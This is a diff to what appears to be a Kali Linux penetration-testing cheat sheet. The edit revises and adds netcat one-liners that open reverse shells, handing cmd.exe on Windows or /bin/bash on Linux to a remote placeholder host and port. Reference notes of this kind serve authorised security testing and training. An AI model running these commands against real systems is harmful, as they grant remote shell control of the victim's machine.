@@ -142,7 +142,11 @@ Kali Linux
         `nc -nlvp 4444 > incoming.exe`
 
     -   Create a reverse shell with Ncat using cmd.exe on Windows  
-        `nc -nlvp 4444 -e cmd.exe`
+        `nc.exe -nlvp 4444 -e cmd.exe`
+        
+        or
+        
+        `nc.exe -nv <Remote IP> <Remote Port> -e cmd.exe`
 
     -   Create a reverse shell with Ncat using bash on Linux  
         `nc -nv $ip 4444 -e /bin/bash`
